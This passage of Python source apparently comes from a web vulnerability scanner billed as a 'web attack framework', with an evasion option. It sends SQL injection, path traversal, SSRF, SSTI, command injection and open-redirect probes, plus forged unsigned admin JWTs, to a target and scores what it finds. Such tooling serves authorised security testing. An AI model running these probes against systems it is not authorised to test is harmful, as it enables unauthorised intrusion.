                        SQLiDetector.time_confidence(z1, s1.elapsed - base_stat['elapsed_mean'], delay),
                        SQLiDetector.time_confidence(z2, s2.elapsed - base_stat['elapsed_mean'], delay),
                    )
                    if z1 >= TIME_ZSCORE_CONFIRMED and z2 >= TIME_ZSCORE_PROBABLE:
                        confidence = max(confidence, 0.93)

                    if confidence >= CONFIDENCE_PROBABLE:
                        finding = Finding(
                            vuln_type=f'Time-Blind SQL Injection ({dbms})',
                            url=url, parameter=param, payload=payload,
                            confidence=confidence, severity='CRITICAL',
                            cvss=9.8, cwe='CWE-89',
                            evidence=[
                                f'baseline_elapsed_mean={base_stat["elapsed_mean"]:.3f}',
                                f'baseline_stdev={base_stat["elapsed_stdev"]:.3f}',
                                f'observed_1={s1.elapsed:.3f} (z={z1:.2f})',
                                f'observed_2={s2.elapsed:.3f} (z={z2:.2f})',
                                f'requested_delay={delay}',
                                f'avg_delta={avg_delta:.3f}',
                            ],
                        )
                        self._record(finding)
                        findings.append(finding)
                        break

        self.results['findings'] = self.aggregator.all()
        return findings

    # ─────────────────────────────────────────────────────────
    #  5. LFI / Path Traversal — fingerprint-based validator
    # ─────────────────────────────────────────────────────────
    def test_lfi(self) -> List[Finding]:
        self._print('info', 'Testing for Local File Inclusion / Path Traversal...')
        params = ['file', 'page', 'include', 'path', 'template', 'view',
                  'doc', 'document', 'load', 'read', 'dir', 'lang',
                  'language', 'module', 'theme', 'skin']
        findings: List[Finding] = []

        for base_url in self.base_urls[:2]:
            for param in params:
                for payload in LFI_PAYLOADS:
                    url = f'{base_url}/?{param}={urllib.parse.quote(payload)}'
                    s = self.client.get(url, timeout=8)
                    if s.status == 0:
                        continue
                    sig, conf, evidence = LFIValidator.validate(s.body, payload)
                    if sig and conf >= CONFIDENCE_PROBABLE:
                        finding = Finding(
                            vuln_type='Local File Inclusion / Path Traversal',
                            url=url, parameter=param, payload=payload,
                            confidence=conf, severity='HIGH',
                            cvss=7.5, cwe='CWE-22',
                            evidence=[f'signature={sig}'] + evidence,
                        )
                        self._record(finding)
                        findings.append(finding)
                        break

        self.results['findings'] = self.aggregator.all()
        return findings

    # ─────────────────────────────────────────────────────────
    #  6. SSRF
    # ─────────────────────────────────────────────────────────
    def test_ssrf(self) -> List[Finding]:
        self._print('info', 'Testing for Server-Side Request Forgery...')
        params = ['url', 'uri', 'link', 'src', 'source', 'dest', 'destination',
                  'redirect', 'target', 'fetch', 'load', 'proxy', 'image',
                  'img', 'callback', 'webhook', 'host', 'ip', 'addr',
                  'feed', 'rss', 'site', 'domain', 'remote', 'data']
        findings: List[Finding] = []

        for base_url in self.base_urls[:2]:
            for param in params:
                for payload in SSRF_PAYLOADS:
                    url = f'{base_url}/?{param}={urllib.parse.quote(payload)}'
                    s = self.client.get(url, timeout=8)
                    if s.status == 0:
                        continue
                    target, conf, evidence = SSRFValidator.validate(s.body, s.headers)
                    if target and conf >= CONFIDENCE_PROBABLE:
                        finding = Finding(
                            vuln_type=f'SSRF ({target})',
                            url=url, parameter=param, payload=payload,
                            confidence=conf, severity='CRITICAL',
                            cvss=9.1, cwe='CWE-918',
                            evidence=evidence,
                        )
                        self._record(finding)
                        findings.append(finding)
                        break

        self.results['findings'] = self.aggregator.all()
        return findings

    # ─────────────────────────────────────────────────────────
    #  7. CORS Misconfiguration
    # ─────────────────────────────────────────────────────────
    def test_cors(self) -> List[Finding]:
        self._print('info', 'Testing CORS configuration...')
        findings: List[Finding] = []

        for base_url in self.base_urls[:2]:
            for origin_template in CORS_ORIGINS:
                origin = origin_template.format(rand=random.randint(1000, 9999))
                s = self.client.get(base_url, headers={'Origin': origin})
                if s.status == 0:
                    continue
                acao = s.headers.get('Access-Control-Allow-Origin', '')
                acac = s.headers.get('Access-Control-Allow-Credentials', '')
                if not acao:
                    continue
                creds = acac.lower() == 'true'
                # High confidence if reflects exact attacker origin
                if acao == origin:
                    conf = 0.97 if creds else 0.85
                elif acao == '*':
                    conf = 0.4 if not creds else 0.85   # '*' alone is low risk unless paired with creds
                elif acao == 'null' and origin == 'null':
                    conf = 0.92 if creds else 0.6
                else:
                    continue
                finding = Finding(
                    vuln_type='CORS Misconfiguration',
                    url=base_url, parameter='Origin', payload=origin,
                    confidence=conf, severity='HIGH' if creds else 'MEDIUM',
                    cvss=8.1 if creds else 5.4, cwe='CWE-942',
                    evidence=[f'Access-Control-Allow-Origin={acao}',
                              f'Access-Control-Allow-Credentials={acac}'],
                )
                self._record(finding)
                findings.append(finding)

        self.results['cors'] = [asdict(f) for f in findings]
        return findings

    # ─────────────────────────────────────────────────────────
    #  8. JWT (none-alg / weak-secret discovery hints)
    # ─────────────────────────────────────────────────────────
    def test_jwt_weaknesses(self) -> List[Finding]:
        self._print('info', 'Probing JWT attack surface...')
        import base64
        findings: List[Finding] = []

        def b64url(data: str) -> str:
            return base64.urlsafe_b64encode(data.encode()).rstrip(b'=').decode()

        none_tokens = [f'{b64url(json.dumps({"alg":a,"typ":"JWT"}))}.{b64url(json.dumps({"sub":"1","role":"admin","iat":1700000000}))}.'
                       for a in ('none', 'None', 'NONE', 'nOnE')]

        endpoints = ['/api/user', '/api/me', '/api/profile',
                     '/api/admin', '/dashboard', '/user/info',
                     '/api/v1/me', '/api/v1/admin', '/admin/users']
        for base_url in self.base_urls[:2]:
            # Establish baseline behavior for these endpoints WITHOUT auth.
            unauth_status: Dict[str, int] = {}
            for ep in endpoints:
                s = self.client.get(base_url + ep, timeout=8)
                unauth_status[ep] = s.status

            for ep in endpoints:
                url = base_url + ep
                base_status = unauth_status.get(ep, 0)
                # If endpoint is already publicly accessible, no JWT bypass to find.
                if base_status not in (401, 403):
                    continue
                for token in none_tokens[:2]:
                    s = self.client.get(url, headers={'Authorization': f'Bearer {token}'})
                    if s.status == 0:
                        continue
                    if s.status in (200, 201, 202) and s.body_len > 50:
                        # Make sure body changed meaningfully vs unauth response.
                        finding = Finding(
                            vuln_type='JWT None-Algorithm Bypass',
                            url=url, parameter='Authorization', payload=token,
                            confidence=0.92, severity='CRITICAL',
                            cvss=9.8, cwe='CWE-347',
                            evidence=[f'unauth={base_status} → with_none_jwt={s.status}'],
                        )
                        self._record(finding)
                        findings.append(finding)
                        break

        self.results['jwt_issues'] = [asdict(f) for f in findings]
        return findings

    # ─────────────────────────────────────────────────────────
    #  9. API Endpoint Discovery
    # ─────────────────────────────────────────────────────────
    def discover_api_endpoints(self) -> List[Dict[str, Any]]:
        self._print('info', 'Discovering API endpoints...')
        api_paths = [
            '/api', '/api/v1', '/api/v2', '/api/v3', '/graphql', '/graphiql',
            '/playground', '/swagger', '/swagger-ui', '/swagger.json',
            '/swagger/v1/swagger.json', '/openapi.json', '/openapi.yaml',
            '/api-docs', '/api-docs.json', '/redoc', '/v1', '/v2', '/v3',
            '/rest', '/rpc', '/jsonrpc', '/soap', '/wsdl', '/?wsdl',
            '/api/swagger', '/api/swagger-ui.html', '/api/openapi.json',
            '/api/users', '/api/user', '/api/me', '/api/health',
            '/api/status', '/api/config', '/api/settings', '/api/admin',
            '/api/products', '/api/orders',
        ]
        discovered: List[Dict[str, Any]] = []
        for base_url in self.base_urls[:2]:
            for path in api_paths:
                url = base_url + path
                s = self.client.get(url, timeout=6)
                if s.status not in (200, 201, 401, 403) or s.body_len < 20:
                    continue
                ct = s.headers.get('Content-Type', '')
                entry = {
                    'url': url, 'status': s.status,
                    'content_type': ct, 'size': s.body_len,
                    'has_swagger': 'swagger' in s.body.lower() or 'openapi' in s.body.lower(),
                    'is_json': 'json' in ct.lower() or s.body.strip().startswith('{'),
                    'introspection_enabled': self._graphql_introspection_check(s.body),
                }
                discovered.append(entry)
                indicator = f'{G}[SWAGGER]{X}' if entry['has_swagger'] else f'{M}[API]{X}'
                self._print('find', f'{indicator} HTTP {s.status} {url}')
                if entry['introspection_enabled']:
                    self._record(Finding(
                        vuln_type='GraphQL Introspection Enabled',
                        url=url, parameter=None, payload='',
                        confidence=0.95, severity='MEDIUM', cvss=5.3,
                        cwe='CWE-200', evidence=['__schema in body'],
                    ))

        self.results['api_endpoints'] = discovered
        return discovered

    @staticmethod
    def _graphql_introspection_check(body: str) -> bool:
        return ('"__schema"' in body and '"types"' in body) or '__typename' in body

    # ─────────────────────────────────────────────────────────
    #  10. Header Injection / Host Header Attacks
    # ─────────────────────────────────────────────────────────
    def test_header_injection(self) -> List[Finding]:
        self._print('info', 'Testing HTTP header injection / Host header attacks...')
        findings: List[Finding] = []

        for base_url in self.base_urls[:1]:
            base_sample = self.client.get(base_url)
            for hdr_name, hdr_val in HTTP_HEADERS_INJECTION:
                s = self.client.get(base_url, headers={hdr_name: hdr_val})
                if s.status == 0:
                    continue
                # For Host/X-Forwarded-Host: detect cache poisoning by checking
                # whether the malicious value is reflected in body or response headers.
                reflected_in_body = hdr_val in s.body
                reflected_in_loc = hdr_val in s.headers.get('Location', '')
                if reflected_in_body or reflected_in_loc:
                    finding = Finding(
                        vuln_type=f'Header Reflection ({hdr_name})',
                        url=base_url, parameter=hdr_name, payload=hdr_val,
                        confidence=0.85, severity='MEDIUM', cvss=5.3,
                        cwe='CWE-444',
                        evidence=[f'reflected_in_body={reflected_in_body}',
                                  f'reflected_in_location={reflected_in_loc}'],
                    )
                    self._record(finding)
                    findings.append(finding)
                # Local IP header acceptance — if status changed dramatically,
                # the application trusts the header.
                if hdr_name in ('X-Forwarded-For', 'X-Real-IP', 'X-Client-IP'):
                    if base_sample.status in (401, 403) and s.status == 200:
                        finding = Finding(
                            vuln_type=f'IP Spoofing via {hdr_name}',
                            url=base_url, parameter=hdr_name, payload=hdr_val,
                            confidence=0.9, severity='HIGH', cvss=7.5,
                            cwe='CWE-290',
                            evidence=[f'unauth={base_sample.status} → with_header={s.status}'],
                        )
                        self._record(finding)
                        findings.append(finding)

        self.results['header_issues'] = [asdict(f) for f in findings]
        return findings

    # ─────────────────────────────────────────────────────────
    #  11. SSTI
    # ─────────────────────────────────────────────────────────
    def test_ssti(self) -> List[Finding]:
        self._print('info', 'Testing for Server-Side Template Injection...')
        params = ['name', 'q', 'msg', 'message', 'template', 'page',
                  'lang', 'subject', 'body', 'comment']
        findings: List[Finding] = []
        for base_url in self.base_urls[:2]:
            for param in params:
                # Baseline with random benign string
                rnd = ''.join(random.choices(string.ascii_lowercase, k=8))
                bs = self.client.get(f'{base_url}/?{param}={rnd}', timeout=8)
                if bs.status == 0:
                    continue
                for probe, expected, engine in SSTIDetector.PROBES:
                    url = f'{base_url}/?{param}={urllib.parse.quote(probe)}'
                    s = self.client.get(url, timeout=8)
                    if s.status == 0:
                        continue
                    conf = SSTIDetector.confidence(probe, expected, s.body, bs.body)
                    if conf >= CONFIDENCE_PROBABLE:
                        finding = Finding(
                            vuln_type=f'SSTI ({engine})',
                            url=url, parameter=param, payload=probe,
                            confidence=conf, severity='CRITICAL',
                            cvss=9.8, cwe='CWE-1336',
                            evidence=[f'engine={engine}',
                                      f'evaluated={expected!r} present in body'],
                        )
                        self._record(finding)
                        findings.append(finding)
                        break
        self.results['findings'] = self.aggregator.all()
        return findings

    # ─────────────────────────────────────────────────────────
    #  12. OS Command Injection
    # ─────────────────────────────────────────────────────────
    def test_command_injection(self) -> List[Finding]:
        self._print('info', 'Testing for OS Command Injection (canary-based)...')
        params = ['cmd', 'exec', 'command', 'host', 'ip', 'ping', 'query',
                  'lookup', 'name', 'param', 'arg', 'input', 'file']
        findings: List[Finding] = []
        for base_url in self.base_urls[:2]:
            for param in params:
                canary, _ = CommandInjectionDetector.random_canary()
                hit = False
                for payload in CommandInjectionDetector.payload_set(canary):
                    url = f'{base_url}/?{param}={urllib.parse.quote(payload)}'
                    s = self.client.get(url, timeout=10)
                    if s.status == 0:
                        continue
                    conf = CommandInjectionDetector.confidence(s.body, canary)
                    if conf >= CONFIDENCE_PROBABLE:
                        finding = Finding(
                            vuln_type='OS Command Injection',
                            url=url, parameter=param, payload=payload,
                            confidence=conf, severity='CRITICAL',
                            cvss=9.8, cwe='CWE-78',
                            evidence=[f'canary={canary} echoed in body'],
                        )
                        self._record(finding)
                        findings.append(finding)
                        hit = True
                        break
                if hit:
                    continue
        self.results['findings'] = self.aggregator.all()
        return findings

    # ─────────────────────────────────────────────────────────
    #  13. Open Redirect
    # ─────────────────────────────────────────────────────────
    def test_open_redirect(self) -> List[Finding]:
        self._print('info', 'Testing for Open Redirect...')
        params = ['url', 'redirect', 'next', 'return', 'returnTo', 'goto',
                  'target', 'continue', 'r', 'destination', 'redir', 'origin',
                  'success_url', 'callback']
        findings: List[Finding] = []
        canary_host = 'attacker-canary.example.invalid'
        bypass_payloads = [
            f'https://{canary_host}',
            f'//{canary_host}',
            f'/\\/\\{canary_host}',
            f'/%2f%2f{canary_host}',
            f'https:/{canary_host}',
            f'///{canary_host}',
            f'@{canary_host}',
            f'https://example.com@{canary_host}',
        ]
        for base_url in self.base_urls[:2]:
            for param in params:
                for payload in bypass_payloads:
                    url = f'{base_url}/?{param}={urllib.parse.quote(payload)}'
                    s = self.client.get(url, timeout=8)
                    if s.status == 0:
                        continue
                    location = s.headers.get('Location', '')
                    if canary_host in location:
                        finding = Finding(
                            vuln_type='Open Redirect',
                            url=url, parameter=param, payload=payload,
                            confidence=0.95, severity='MEDIUM', cvss=6.1,
                            cwe='CWE-601',
                            evidence=[f'Location: {location}'],
                        )
                        self._record(finding)
                        findings.append(finding)
                        break
        self.results['findings'] = self.aggregator.all()
        return findings

    # ─────────────────────────────────────────────────────────
    #  ORCHESTRATION
    # ─────────────────────────────────────────────────────────
    def run_full_web_attack(self) -> dict:
        print(f'\n{C}╔══════════════════════════════════════════════════════════╗{X}')
        print(f'{C}║{X} {B}{M}[WEB ATTACK FRAMEWORK — INDUSTRIAL]{X} {Y}{self.target}{X}')
        print(f'{C}║{X} Safe={self.safe_mode}  Evade={self.evade}  '
              f'Threads={self.max_threads}  Threshold={self.confidence_threshold:.2f}')
        print(f'{C}╚══════════════════════════════════════════════════════════╝{X}\n')

        if not self.base_urls:
            self._print('warn', 'No web services detected — skipping web attack module')
            return self.results

        self.fingerprint_environment()
        self.audit_security_headers()
        self.fuzz_directories()
        self.test_xss()
        self.test_sqli()
        self.test_lfi()
        self.test_ssrf()
        self.test_cors()
        self.test_jwt_weaknesses()
        self.discover_api_endpoints()
        self.test_header_injection()
        self.test_ssti()
        self.test_command_injection()
        self.test_open_redirect()

        all_findings = self.aggregator.all()
        confirmed = [f for f in all_findings if f.confidence >= CONFIDENCE_CONFIRMED]
        probable  = [f for f in all_findings
                     if CONFIDENCE_PROBABLE <= f.confidence < CONFIDENCE_CONFIRMED]
        suspected = [f for f in all_findings
                     if CONFIDENCE_SUSPECTED <= f.confidence < CONFIDENCE_PROBABLE]

        self.results['findings'] = [asdict(f) for f in all_findings]
        self.results['summary'] = {
            'confirmed': len(confirmed),
            'probable':  len(probable),
            'suspected': len(suspected),
            'total':     len(all_findings),
        }
        self.results['completed_at'] = datetime.now().isoformat()

        print(f'\n{G}[✓]{X} Web attack module complete — '
              f'{R}{len(confirmed)}{X} confirmed | '
              f'{Y}{len(probable)}{X} probable | '
              f'{C}{len(suspected)}{X} suspected')
        return self.results

    # ─────────────────────────────────────────────────────────
    #  Backwards-compat aliases
    # ─────────────────────────────────────────────────────────
    audit_security_headers.__doc__ = "Backwards-compatible name."
